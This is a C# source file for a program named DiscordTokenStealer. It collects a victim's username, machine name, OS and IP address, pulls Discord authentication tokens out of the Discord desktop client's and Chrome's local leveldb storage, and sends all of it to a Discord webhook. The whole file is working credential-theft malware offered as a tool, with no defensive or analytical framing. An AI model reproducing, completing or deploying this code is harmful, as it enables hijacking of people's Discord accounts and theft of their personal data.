using Discord;
using System.Net;
using System.Text;
using Microsoft.Win32;
using System.Text.RegularExpressions;
using System.Runtime.InteropServices;
using static DiscordTokenStealer.IPInfo;

namespace DiscordTokenStealer
{
    internal static class Program
    {
        private static async Task Main(string[] args)
        {
            if (!RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
            {
                // Only windows supported for grabbing tokens, uncomment this if you want to only grab basic information about the victim.
                return;
            }
            StringBuilder content = new StringBuilder($"Username: {Environment.UserName}{Environment.NewLine}").AppendLine($"Machine Name: {Environment.MachineName}").AppendLine($"Operating System: {Environment.OSVersion.Platform}");
            IPAddress? ipAddress = await GetIPAddress();
            if (ipAddress != null)
            {
                content.AppendLine($"IPAddress: {ipAddress}");
            }
            List<string> tokens = GetDiscordTokens();
            if (tokens.Any())
            {
                content.AppendLine("Tokens: ");
                foreach (string token in tokens)
                {
                    content.AppendLine(token);
                }
                content.AppendLine();
            }
            using DiscordWebhook webhook = new DiscordWebhook("https://discord.com/api/webhooks/{webhook.id}/{webhook.token}");
            await webhook.SendMessage(content.ToString());
        }

        private static List<string> GetDiscordTokens()
        {
            List<string> tokens = new List<string>(2);
            string? browserToken = GetBrowserDiscordToken();
            if (browserToken != null)
            {
                tokens.Add(browserToken);
            }
            string? desktopToken = GetDesktopClientToken();
            if (desktopToken != null)
            {
                tokens.Add(desktopToken);
            }
            return tokens;
        }
        
        // Chrome only
        // Unsure if this works
        // I don't have chrome installed
        private static string? GetBrowserDiscordToken()
        {
            FileInfo? defaultBrowser = GetDefaultBrowserLocation();
            if (defaultBrowser == null || defaultBrowser.Directory == null || !defaultBrowser.FullName.ToLower().Contains("chrome"))
            {
                return null;
            }
            return ParseToken($"{defaultBrowser.Directory.Name.Split(' ').Aggregate(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), Path.Combine)}{"\\User Data\\Default\\Local Storage\\leveldb\\"}") ?? null;
        }

        private static string? GetDesktopClientToken()
        {
            return ParseToken(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\");
        }

        private static readonly Regex TokenRegex = new Regex("[[]oken.*?\"((?:mfa|nfa))[.](.*?)\"", RegexOptions.Compiled);
        private static string? ParseToken(string directory)
        {
            if (!Directory.Exists(directory))
            {
                throw new DirectoryNotFoundException("Provied directory doesn't exist.");
            }
            foreach (GroupCollection groups in Directory.GetFiles(directory, "*.ldb").Select(filePath => TokenRegex.Match(File.ReadAllText(filePath))).Where(match => match.Success && match.Groups.Count >= 3).Select(match => match.Groups))
            {
                return $"{groups[1].Value}.{groups[2].Value}";
            }
            return null;
        }

        // https://stackoverflow.com/a/17599201
        private const string ExeFileExtension = ".exe";
        private static FileInfo? GetDefaultBrowserLocation()
        {
            try
            {
                string? path = Registry.ClassesRoot.OpenSubKey(@$"{Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\Shell\Associations\UrlAssociations\http\UserChoice")?.GetValue("Progid")}\shell\open\command")?.GetValue(null)?.ToString()?.ToLower()
                                                   .Replace("\"", string.Empty);
                if (path == null || !path.EndsWith(ExeFileExtension))
                {
                    return null;
                }
                FileInfo fileInfo = new FileInfo(path[..(path.LastIndexOf(ExeFileExtension, StringComparison.Ordinal) + ExeFileExtension.Length)]);
                return !fileInfo.Exists ? null : fileInfo;
            }
            catch
            {
                return null;
            }
        }

        private static async Task<IPAddress?> GetIPAddress()
        {
            IPAddress? local = await GetLocalIPv4() ?? await GetLocalIPv6() ?? null;
            if (!System.Net.NetworkInformation.NetworkInterface.GetIsNetworkAvailable())
            {
                return local;
            }
            IPInformation? info = await GetIpInformation();
            if (info == null || !IPAddress.TryParse(info.IP, out IPAddress? address))
            {
                return local;
            }
            return (info.Privacy != null && (info.Privacy.VPN || info.Privacy.Proxy || info.Privacy.Tor)) ? local : address;
        }
    }
}
